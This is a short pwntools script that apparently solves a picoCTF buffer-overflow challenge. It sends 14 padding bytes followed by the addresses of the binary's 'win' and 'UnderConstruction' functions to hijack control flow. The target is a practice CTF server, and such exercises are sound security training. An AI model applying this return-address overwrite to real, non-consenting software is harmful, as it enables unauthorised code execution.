from pwn import *
r = remote('saturn.picoctf.net', 51893)
elf = ELF("./vuln")
payload = b"a"*14 + p32(elf.symbols['win']) + p32(elf.symbols['UnderConstruction'])
r.sendlineafter("Give me a string that gets you the flag\n", payload)
r.interactive()
